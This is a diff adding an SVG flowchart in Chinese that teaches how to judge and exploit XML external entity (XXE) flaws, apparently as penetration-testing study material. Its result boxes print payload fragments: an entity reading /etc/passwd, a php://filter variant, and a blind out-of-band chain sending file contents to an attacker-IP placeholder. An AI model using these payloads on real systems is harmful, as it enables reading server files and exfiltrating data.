@@ -1,0 +1,82 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="900" height="640" viewBox="0 0 900 640" font-family="'Microsoft YaHei','PingFang SC',sans-serif">
+  <defs>
+    <marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
+      <path d="M0,0 L0,6 L9,3 z" fill="#4b5563"/>
+    </marker>
+    <marker id="arrowYes" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
+      <path d="M0,0 L0,6 L9,3 z" fill="#16a34a"/>
+    </marker>
+    <marker id="arrowNo" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
+      <path d="M0,0 L0,6 L9,3 z" fill="#dc2626"/>
+    </marker>
+  </defs>
+
+  <rect width="900" height="640" fill="#fafafa"/>
+
+  <text x="450" y="30" text-anchor="middle" font-size="19" font-weight="bold" fill="#111827">XXE 漏洞原理与判断流程</text>
+  <text x="450" y="53" text-anchor="middle" font-size="12.5" fill="#6b7280">三个问题依次回答，就能判断这个 XML 解析入口到底能不能打、该怎么打</text>
+
+  <!-- Q1 -->
+  <rect x="300" y="84" width="300" height="56" rx="8" fill="#dbeafe" stroke="#3b82f6" stroke-width="1.6"/>
+  <text x="450" y="108" text-anchor="middle" font-size="13.5" font-weight="bold" fill="#1e3a8a">Q1：是否解析用户可控的 XML？</text>
+  <text x="450" y="127" text-anchor="middle" font-size="11.5" fill="#1e40af">上传 XML / SVG、接口收 XML 报文、改 Content-Type</text>
+
+  <path d="M600,112 L656,112" stroke="#dc2626" stroke-width="1.6" marker-end="url(#arrowNo)" fill="none"/>
+  <text x="628" y="104" text-anchor="middle" font-size="12" fill="#dc2626" font-weight="bold">否</text>
+  <rect x="660" y="90" width="210" height="44" rx="8" fill="#f1f5f9" stroke="#94a3b8" stroke-width="1.4"/>
+  <text x="765" y="117" text-anchor="middle" font-size="12.5" fill="#475569">不存在 XXE，另找入口</text>
+
+  <path d="M450,140 L450,172" stroke="#16a34a" stroke-width="1.6" marker-end="url(#arrowYes)" fill="none"/>
+  <text x="466" y="160" font-size="12" fill="#16a34a" font-weight="bold">是</text>
+
+  <!-- Q2 -->
+  <rect x="300" y="174" width="300" height="56" rx="8" fill="#ede9fe" stroke="#8b5cf6" stroke-width="1.6"/>
+  <text x="450" y="198" text-anchor="middle" font-size="13.5" font-weight="bold" fill="#4c1d95">Q2：是否允许加载外部实体？</text>
+  <text x="450" y="217" text-anchor="middle" font-size="11.5" fill="#5b21b6">LIBXML_NOENT / 未禁用实体加载 / 未过滤 DOCTYPE</text>
+
+  <path d="M600,202 L656,202" stroke="#dc2626" stroke-width="1.6" marker-end="url(#arrowNo)" fill="none"/>
+  <text x="628" y="194" text-anchor="middle" font-size="12" fill="#dc2626" font-weight="bold">否</text>
+  <rect x="660" y="172" width="210" height="60" rx="8" fill="#fff7ed" stroke="#f59e0b" stroke-width="1.4"/>
+  <text x="765" y="196" text-anchor="middle" font-size="12" fill="#92400e">实体走不通</text>
+  <text x="765" y="215" text-anchor="middle" font-size="11.5" fill="#92400e">改试 XInclude / SVG 载体</text>
+
+  <path d="M450,230 L450,262" stroke="#16a34a" stroke-width="1.6" marker-end="url(#arrowYes)" fill="none"/>
+  <text x="466" y="250" font-size="12" fill="#16a34a" font-weight="bold">是</text>
+
+  <!-- Q3 -->
+  <rect x="300" y="264" width="300" height="56" rx="8" fill="#fef9c3" stroke="#eab308" stroke-width="1.6"/>
+  <text x="450" y="288" text-anchor="middle" font-size="13.5" font-weight="bold" fill="#713f12">Q3：解析结果是否回显到响应？</text>
+  <text x="450" y="307" text-anchor="middle" font-size="11.5" fill="#854d0e">源码里有没有 echo / print 那个被引用的节点</text>
+
+  <!-- 分叉 -->
+  <path d="M450,320 L450,346" stroke="#4b5563" stroke-width="1.6" fill="none"/>
+  <path d="M450,346 L228,346 L228,378" stroke="#16a34a" stroke-width="1.6" marker-end="url(#arrowYes)" fill="none"/>
+  <path d="M450,346 L672,346 L672,378" stroke="#dc2626" stroke-width="1.6" marker-end="url(#arrowNo)" fill="none"/>
+  <text x="300" y="340" text-anchor="middle" font-size="12" fill="#16a34a" font-weight="bold">是（有回显）</text>
+  <text x="606" y="340" text-anchor="middle" font-size="12" fill="#dc2626" font-weight="bold">否（无回显）</text>
+
+  <!-- 结果左 -->
+  <rect x="80" y="380" width="296" height="140" rx="8" fill="#dcfce7" stroke="#22c55e" stroke-width="1.8"/>
+  <text x="228" y="404" text-anchor="middle" font-size="13.5" font-weight="bold" fill="#14532d">直接读文件</text>
+  <text x="228" y="426" text-anchor="middle" font-size="11.5" fill="#166534">file:// 读本地文件，内容直接出现在页面</text>
+  <text x="228" y="452" text-anchor="middle" font-size="11.5" fill="#166534">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</text>
+  <text x="228" y="474" text-anchor="middle" font-size="11.5" fill="#166534">回显被过滤时改用 php://filter 编码</text>
+  <text x="228" y="498" text-anchor="middle" font-size="11.5" fill="#166534">判断依据：响应里能看到文件内容</text>
+
+  <!-- 结果右 -->
+  <rect x="524" y="380" width="296" height="140" rx="8" fill="#fee2e2" stroke="#ef4444" stroke-width="1.8"/>
+  <text x="672" y="404" text-anchor="middle" font-size="13.5" font-weight="bold" fill="#7f1d1d">盲 XXE（OOB 外带）</text>
+  <text x="672" y="426" text-anchor="middle" font-size="11.5" fill="#991b1b">用参数实体把数据拼进外带 URL</text>
+  <text x="672" y="452" text-anchor="middle" font-size="11.5" fill="#991b1b">&lt;!ENTITY % f SYSTEM "php://filter/.../passwd"&gt;</text>
+  <text x="672" y="474" text-anchor="middle" font-size="11.5" fill="#991b1b">&lt;!ENTITY % e "&lt;!ENTITY &amp;#37; send SYSTEM</text>
+  <text x="672" y="492" text-anchor="middle" font-size="11.5" fill="#991b1b">'http://攻击者IP/?%f;'&gt;"&gt;</text>
+  <text x="672" y="512" text-anchor="middle" font-size="11.5" fill="#991b1b">判断依据：攻击者服务器收到 DNS/HTTP 请求</text>
+
+  <!-- 结论 -->
+  <rect x="180" y="552" width="540" height="62" rx="8" fill="#f1f5f9" stroke="#64748b" stroke-width="1.6"/>
+  <text x="450" y="576" text-anchor="middle" font-size="13" fill="#1e293b">判断 XXE 就三步：能否解析 XML → 能否加载外部实体 → 能否看到结果</text>
+  <text x="450" y="598" text-anchor="middle" font-size="11.5" fill="#475569">最稳的探测手法：外部实体指向自己的 HTTP 服务器，看有没有收到回连请求</text>
+
+  <path d="M228,520 L228,550" stroke="#94a3b8" stroke-width="1.4" fill="none" stroke-dasharray="4 3"/>
+  <path d="M672,520 L672,550" stroke="#94a3b8" stroke-width="1.4" fill="none" stroke-dasharray="4 3"/>
+</svg>
